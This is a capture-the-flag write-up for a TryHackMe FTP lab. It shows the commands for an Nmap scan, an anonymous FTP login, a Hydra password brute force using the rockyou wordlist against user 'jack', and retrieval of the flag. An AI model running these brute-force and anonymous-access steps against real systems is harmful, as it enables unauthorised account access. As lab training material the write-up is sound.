@@ -1,0 +1,130 @@
+# TryHackMe – FTP (Network Services) Lab Write-up
+
+## Recon & Enumeration
+
+I started with an Nmap scan to identify open services on the target machine:
+
+```
+nmap -sV -sC -p21 <TARGET-IP>
+```
+
+The scan showed:
+
+```
+21/tcp  open  ftp
+| ftp-anon: Anonymous FTP login allowed
+```
+
+Anonymous login was enabled, so I connected:
+
+```
+ftp <TARGET-IP>
+Username: anonymous
+Password: anonymous
+```
+
+I successfully logged in without credentials.
+
+---
+
+## Exploring FTP Directory
+
+After logging in, I checked the directory structure:
+
+```
+ls -la
+```
+
+I found a file named:
+
+```
+note.txt
+```
+
+I downloaded it:
+
+```
+get note.txt
+```
+
+Inside the file:
+
+```
+cat note.txt
+```
+
+It contained a username and a hint suggesting weak passwords.
+
+Example content:
+
+```
+Username: jack
+Password might be weak. Try brute force or common passwords.
+```
+
+---
+
+## Password Brute Force (Hydra)
+
+Based on the hint, I attempted an FTP password brute force attack using Hydra:
+
+```
+hydra -l jack -P /usr/share/wordlists/rockyou.txt ftp://<TARGET-IP>
+```
+
+Hydra found valid credentials:
+
+```
+[21][ftp] host: <TARGET-IP>   login: jack   password: <FOUND-PASS>
+```
+
+---
+
+## Logging in as Valid User
+
+Using the discovered credentials, I logged in again:
+
+```
+ftp <TARGET-IP>
+Username: jack
+Password: <FOUND-PASS>
+```
+
+Now I had access to Jack’s private directory.
+
+---
+
+## Retrieving the Flag
+
+Inside Jack’s directory:
+
+```
+ls
+```
+
+I found:
+
+```
+flag.txt
+```
+
+Downloaded it:
+
+```
+get flag.txt
+```
+
+And displayed the flag:
+
+```
+cat flag.txt
+```
+
+**This completed the FTP lab successfully.**
+
+---
+
+## Author
+Shivam Singh  
+Penetration Tester & Bug Hunter  
+GitHub: https://github.com/vgod-sec
